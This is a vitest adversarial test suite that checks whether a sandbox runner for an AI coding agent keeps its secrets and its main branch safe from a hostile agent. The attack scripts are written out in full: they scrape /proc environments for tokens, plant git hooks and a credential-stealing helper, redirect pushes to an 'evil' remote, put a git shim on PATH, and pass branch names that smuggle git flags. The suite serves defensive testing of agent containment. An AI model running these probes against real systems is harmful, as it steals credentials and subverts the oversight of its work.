import { execFileSync } from "node:child_process";
import { mkdirSync, mkdtempSync, readdirSync, readFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";

import { describe, expect, it } from "vitest";

import { RUNNER_LAUNCH_COMMAND } from "./launch.js";

// PILE-277 — pullfrog's adversarial suite ported to Pile lane sandboxes.
// Each scenario launches the real runner exactly as a sandbox does
// (RUNNER_LAUNCH_COMMAND → core.py + a driver), runs an attacker script as
// the lane agent with the env and checkout the runner hands it, then lets
// the runner commit and push to a local bare remote. Assertions are on what
// actually happened: secrets in the attacker's output, canary files from
// hooks/shims, and refs on the remote.
//
// pullfrog probe            → scenario here
// fsExfil / tokenExfil      → "agent process can't read runner secrets"
// askpassIntercept          → credential.helper / askpass / fsmonitor probe
// gitHooks                  → hooksPath + .git/hooks escapes
// gitFlagInjection          → hostile BRANCH values never reach git argv
// pushRestrictedAdversarial → hostile BRANCH + in-checkout push remapping
// nobash creative bypasses  → `git` shim on PATH, tampered git binary
// requirementsTxtAttack /
// packageJsonScripts        → repo-controlled code (.pile/setup.sh) runs
//                             without runner credentials
// Pile lanes give the agent a full shell, so install-time code execution is
// in the threat model by construction — the boundary these probes defend is
// what that code can reach, which is what's asserted.

const RUNNER_DIR = import.meta.dirname;
const LANE = "issue-277-lane";

const SECRETS = {
  GITHUB_TOKEN: `ghs_adversarialGithub${crypto.randomUUID().replaceAll("-", "")}`,
  LANE_TOKEN: `lane-${crypto.randomUUID()}`,
  PILE_LOG_TOKEN: `log-${crypto.randomUUID()}`,
  DEVIN_CREDENTIALS_B64: `creds-${crypto.randomUUID()}`,
};

// Stand-in driver appended to core.py the same way cursor.py/devin.py are:
// GitHub API stubbed, remote pointed at a local bare repo, the "agent" is a
// bash script run with agent_env() from the checkout.
const DRIVER = `
SCENARIO = json.loads(os.environ['ADV_SCENARIO'])
GITHUB_GIT_URL = os.environ['ADV_REMOTE']
RESULT_FILE = os.path.join(HOME, 'agent-result.json')


def github_api(method, path, body=None):
    if method == 'GET' and path == '':
        return {'default_branch': 'main'}
    if method == 'GET' and path == '/git/ref/heads/main':
        return {'object': {'sha': '0' * 40}}
    if method == 'POST' and path == '/git/refs':
        return {}
    raise AssertionError('unexpected github_api call: %s %s' % (method, path))


def agent_env():
    env = os.environ.copy()
    env['HOME'] = HOME
    env['PATH'] = INSTALL_DIR + ':' + env.get('PATH', '')
    return env


def main():
    global GIT_BIN, _GIT_PINS
    out = {}
    try:
        create_branch()
        subprocess.run([GIT_BIN, 'clone', '-q', '--branch', BRANCH, GITHUB_GIT_URL, REPO_DIR], env=runner_git_env(), check=True)
        sanitize_git_config()
        if SCENARIO.get('pinCopy'):
            copy = os.path.join(HOME, 'git-pinned')
            shutil.copy2(GIT_BIN, copy)
            GIT_BIN, _GIT_PINS = copy, {copy: _sha256(copy)}
        if SCENARIO.get('setupHook'):
            run_setup_hook(agent_env)
        attack = subprocess.run(['bash', '-c', SCENARIO.get('attack', 'true')], cwd=REPO_DIR, env=agent_env(), capture_output=True, text=True)
        out['attack'] = attack.stdout + attack.stderr
        print(SCENARIO.get('agentPrints', ''))
        write_result('completed', '', 'leak? ' + GITHUB_TOKEN + ' ' + secret('LANE_TOKEN'))
        with open(RESULT_FILE) as f:
            out['resultFile'] = f.read()
        out['pushed'] = commit_and_push()
    except Exception as e:
        out['error'] = str(e)
    try:
        with open(os.path.join(REPO_DIR, '.git', 'config')) as f:
            out['gitConfig'] = f.read()
    except OSError:
        pass
    with open(os.environ['ADV_OUT'], 'w') as f:
        json.dump(out, f)
    return 0


if __name__ == '__main__':
    sys.exit(main())
`;

const RUNNER_PY_B64 = Buffer.from(
  readFileSync(join(RUNNER_DIR, "core.py"), "utf8") + DRIVER
).toString("base64");

const GIT_ENV = {
  ...process.env,
  GIT_CONFIG_GLOBAL: "/dev/null",
  GIT_CONFIG_NOSYSTEM: "1",
  GIT_AUTHOR_NAME: "seed",
  GIT_AUTHOR_EMAIL: "seed@example.com",
  GIT_COMMITTER_NAME: "seed",
  GIT_COMMITTER_EMAIL: "seed@example.com",
};

function git(args: string[], cwd?: string): string {
  return execFileSync("git", args, {
    cwd,
    env: GIT_ENV,
    encoding: "utf8",
  }).trim();
}

interface Scenario {
  branch?: string;
  attack?: string;
  agentPrints?: string;
  pinCopy?: boolean;
  setupHook?: string;
}

interface Outcome {
  attack: string;
  pushed?: boolean;
  error?: string;
  resultFile?: string;
  gitConfig?: string;
  remoteRefs: Record<string, string>;
  seedMain: string;
  canaries: string[];
  canaryDir: string;
  evilRefs: string;
  log: string;
}

function remoteRefs(remote: string): Record<string, string> {
  const out = git([
    "--git-dir",
    remote,
    "for-each-ref",
    "--format=%(refname) %(objectname)",
  ]);
  return Object.fromEntries(
    out
      .split("\n")
      .filter(Boolean)
      .map((line) => line.split(" ") as [string, string])
  );
}

function runLane(scenario: Scenario): Outcome {
  const root = mkdtempSync(join(tmpdir(), "pile-lane-adv-"));
  const home = join(root, "home");
  const canary = join(root, "canary");
  mkdirSync(home);
  mkdirSync(canary);
  const remote = join(root, "remote.git");
  const evil = join(root, "evil.git");
  git(["init", "-q", "--bare", "-b", "main", remote]);
  git(["init", "-q", "--bare", "-b", "main", evil]);
  const seed = join(root, "seed");
  git(["init", "-q", "-b", "main", seed]);
  execFileSync("sh", ["-c", "echo seed > README.md"], { cwd: seed });
  if (scenario.setupHook) {
    mkdirSync(join(seed, ".pile"));
    execFileSync("sh", ["-c", 'printf "%s" "$HOOK" > .pile/setup.sh'], {
      cwd: seed,
      env: { ...process.env, HOOK: scenario.setupHook },
    });
  }
  git(["add", "-A"], seed);
  git(["commit", "-q", "-m", "seed"], seed);
  git(["push", "-q", remote, "main", `main:refs/heads/${LANE}`], seed);
  const seedMain = git(["rev-parse", "HEAD"], seed);

  const outPath = join(root, "out.json");
  execFileSync("sh", ["-c", RUNNER_LAUNCH_COMMAND], {
    env: {
      ...process.env,
      HOME: home,
      REPO: "acme/widgets",
      BRANCH: scenario.branch ?? LANE,
      ISSUE_TITLE: "Adversarial lane",
      ISSUE_IDENTIFIER: "PILE-277",
      AGENT_LABEL: "Adversary",
      GIT_AUTHOR_NAME: "Adversary",
      GIT_AUTHOR_EMAIL: "adversary@pile.nyc",
      RUNNER_PY_B64,
      ADV_SCENARIO: JSON.stringify(scenario),
      ADV_REMOTE: remote,
      ADV_EVIL: evil,
      ADV_OUT: outPath,
      CANARY: canary,
      ...SECRETS,
    },
    encoding: "utf8",
    timeout: 60_000,
  });
  const result = JSON.parse(readFileSync(outPath, "utf8")) as Omit<
    Outcome,
    "remoteRefs" | "seedMain" | "canaries" | "canaryDir" | "evilRefs" | "log"
  >;
  return {
    ...result,
    remoteRefs: remoteRefs(remote),
    seedMain,
    canaries: readdirSync(canary),
    canaryDir: canary,
    evilRefs: git(["--git-dir", evil, "for-each-ref"]),
    log: readFileSync("/tmp/agent.log", "utf8"),
  };
}

function expectNoSecrets(text: string | undefined) {
  for (const [name, value] of Object.entries(SECRETS)) {
    expect(text ?? "", `${name} leaked`).not.toContain(value);
  }
}

function expectMainUntouched(res: Outcome) {
  expect(res.remoteRefs["refs/heads/main"]).toBe(res.seedMain);
  for (const ref of Object.keys(res.remoteRefs)) {
    expect(["refs/heads/main", `refs/heads/${LANE}`]).toContain(ref);
  }
  expect(res.evilRefs).toBe("");
}

const CHANGE = "echo work >> README.md";

describe("lane sandbox adversarial suite (PILE-277)", () => {
  it("agent process can't read runner secrets from env, /proc, or the checkout (tokenExfil/fsExfil)", () => {
    const res = runLane({
      attack: `
        echo "== env"; env
        echo "== self"; tr '\\0' '\\n' < /proc/self/environ
        echo "== parent $PPID"; tr '\\0' '\\n' < /proc/$PPID/environ; tr '\\0' ' ' < /proc/$PPID/cmdline; echo
        ls -l /proc/$PPID/fd
        echo "== all"; for f in /proc/[0-9]*/environ; do tr '\\0' '\\n' < "$f" 2>/dev/null; done
        echo "== git"; cat .git/config; git config --list --show-origin
        echo "== files"; grep -rIl -e ghs_ -e lane- -e log- "$HOME" /tmp/run.py 2>/dev/null | head -50
      `,
    });
    expect(res.error).toBeUndefined();
    // The probes ran: the parent environ is readable, it just holds no secrets.
    expect(res.attack).toContain("AGENT_LABEL=Adversary");
    expect(res.attack).toContain("== parent");
    expect(res.attack).not.toContain("pile-runner-secrets");
    expectNoSecrets(res.attack);
    expectNoSecrets(res.gitConfig);
  });

  it("runner output, transcript, and result file never echo secrets", () => {
    const res = runLane({
      agentPrints:
        "debug ghp_abcdefghijklmnopqrstuvwxyz0123456789 github_pat_11AAAA_zzz",
    });
    expect(res.error).toBeUndefined();
    expectNoSecrets(res.resultFile);
    expectNoSecrets(res.log);
    expect(res.log).not.toContain("ghp_abcdefghijklmnopqrstuvwxyz0123456789");
    expect(res.log).not.toContain("github_pat_11AAAA_zzz");
  });

  it("agent-planted hooks never run during the runner's commit and push (gitHooks)", () => {
    const hook =
      '#!/bin/sh\necho "$(basename "$0")" > "$CANARY/hook-$(basename "$0")"\nenv > "$CANARY/hook-env-$(basename "$0")"\n';
    const res = runLane({
      attack: `
        mkdir -p "$HOME/evil-hooks"
        for h in pre-commit commit-msg post-commit pre-push reference-transaction post-index-change; do
          printf '%s' '${hook}' > "$HOME/evil-hooks/$h"; cp "$HOME/evil-hooks/$h" .git/hooks/$h
        done
        chmod +x "$HOME/evil-hooks/"* .git/hooks/*
        git config core.hooksPath "$HOME/evil-hooks"
        ${CHANGE}
      `,
    });
    expect(res.error).toBeUndefined();
    expect(res.pushed).toBe(true);
    expect(res.canaries).toEqual([]);
    expectMainUntouched(res);
    expect(res.remoteRefs[`refs/heads/${LANE}`]).not.toBe(res.seedMain);
  });

  it("credential helpers, askpass, fsmonitor, filters, includes, and pushurl in .git/config are inert (askpassIntercept)", () => {
    const res = runLane({
      attack: `
        cat > "$HOME/steal" <<'SH'
#!/bin/sh
echo "$0 $*" >> "$CANARY/steal-$(basename "$0")-$$"
env >> "$CANARY/steal-env-$$"
cat >> "$CANARY/steal-stdin-$$" 2>/dev/null </dev/null
SH
        chmod +x "$HOME/steal"
        git config credential.helper "$HOME/steal"
        git config core.askPass "$HOME/steal"
        git config core.fsmonitor "$HOME/steal"
        git config core.sshCommand "$HOME/steal"
        git config filter.evil.clean "$HOME/steal"
        git config filter.evil.smudge "$HOME/steal"
        git config diff.external "$HOME/steal"
        git config alias.push "!$HOME/steal"
        git config remote.origin.pushurl "$ADV_EVIL"
        git config --add remote.origin.push "+refs/heads/*:refs/heads/main"
        git config remote.origin.mirror true
        git config url."$ADV_EVIL".insteadOf "$ADV_REMOTE"
        git config url."$ADV_EVIL".pushInsteadOf "$ADV_REMOTE"
        printf '[core]\\n\\tfsmonitor = %s\\n' "$HOME/steal" > "$HOME/included"
        git config include.path "$HOME/included"
        git config extensions.worktreeConfig true
        printf '[core]\\n\\thooksPath = /tmp\\n' > .git/config.worktree
        echo '* filter=evil diff=evil' > .gitattributes
        echo '* filter=evil' > .git/info/attributes
        ${CHANGE}
      `,
    });
    expect(res.error).toBeUndefined();
    expect(res.pushed).toBe(true);
    expect(res.canaries).toEqual([]);
    expectMainUntouched(res);
    expect(res.gitConfig).not.toMatch(
      /helper|askpass|fsmonitor|sshcommand|filter|external|alias|pushurl|mirror|insteadof|include|worktreeconfig/i
    );
  });

  it("local ref games can't move the default branch or push tags (pushRestrictedAdversarial)", () => {
    const res = runLane({
      attack: `
        git checkout -q -b main
        echo pwn > pwn.txt && git add pwn.txt && git -c user.name=a -c user.email=a@a commit -q -m pwn
        git tag -a v9 -m tag && git tag light
        git config push.default matching
        git config push.followTags true
        git config branch.${LANE}.merge refs/heads/main
        git config branch.${LANE}.pushRemote "$ADV_EVIL"
        git checkout -q ${LANE}
        git update-ref refs/remotes/origin/main HEAD
        ${CHANGE}
      `,
    });
    expect(res.error).toBeUndefined();
    expect(res.pushed).toBe(true);
    expectMainUntouched(res);
  });

  it.each([
    "main",
    "Main",
    "MASTER",
    "HEAD",
    "refs/heads/main",
    `${LANE}:main`,
    `${LANE}:refs/heads/main`,
    "+main",
    "--force",
    "--receive-pack=touch $CANARY/receive-pack",
    "--upload-pack=touch $CANARY/upload-pack",
    "-c",
    "--exec-path=.",
    "-Cmain",
    "--config-env=core.hooksPath=CANARY",
    "lane/../main",
    "@{-1}",
    "@",
    "lane main",
    "lane.lock",
  ])(
    "rejects hostile lane branch %j before any git or GitHub write (gitFlagInjection)",
    (branch) => {
      const res = runLane({ branch, attack: CHANGE });
      expect(res.error).toMatch(/lane branch/);
      expect(res.pushed).toBeUndefined();
      expect(res.canaries).toEqual([]);
      expectMainUntouched(res);
      expect(res.remoteRefs[`refs/heads/${LANE}`]).toBe(res.seedMain);
    }
  );

  it("a branch named like a ref path lands under refs/heads/, never on main", () => {
    const res = runLane({ branch: "heads/main", attack: CHANGE });
    // The seed remote has no heads/main branch, so the clone fails — what
    // matters is that nothing outside the lane namespace moved.
    expect(res.remoteRefs["refs/heads/main"]).toBe(res.seedMain);
    expect(res.canaries).toEqual([]);
  });

  it("a `git` shim dropped on the agent's PATH never sees the runner's push (nobash creative bypass)", () => {
    const res = runLane({
      attack: `
        mkdir -p "$HOME/.local/bin"
        cat > "$HOME/.local/bin/git" <<SH
#!/bin/sh
echo "\\$@" >> "$CANARY/git-shim"
env >> "$CANARY/git-shim-env"
exec /usr/bin/git "\\$@"
SH
        chmod +x "$HOME/.local/bin/git"
        ${CHANGE}
      `,
    });
    expect(res.error).toBeUndefined();
    expect(res.pushed).toBe(true);
    expect(res.canaries).toEqual([]);
  });

  it("a git binary rewritten by the agent is refused before push (nobash creative bypass)", () => {
    const res = runLane({
      pinCopy: true,
      attack: `printf '\\n#tampered' >> "$HOME/git-pinned"; ${CHANGE}`,
    });
    expect(res.error).toMatch(/changed since the runner started/);
    expect(res.remoteRefs[`refs/heads/${LANE}`]).toBe(res.seedMain);
  });

  it("repo-controlled .pile/setup.sh runs without runner credentials (requirementsTxt/packageJsonScripts)", () => {
    const res = runLane({
      setupHook: `#!/bin/sh
{ env; tr '\\0' '\\n' < /proc/$PPID/environ; for f in /proc/[0-9]*/environ; do tr '\\0' '\\n' < "$f" 2>/dev/null; done; } > "$CANARY/setup-dump"
`,
    });
    expect(res.error).toBeUndefined();
    expect(res.canaries).toEqual(["setup-dump"]);
    const dump = readFileSync(join(res.canaryDir, "setup-dump"), "utf8");
    expect(dump).toContain("AGENT_LABEL=Adversary");
    expectNoSecrets(dump);
  });
});
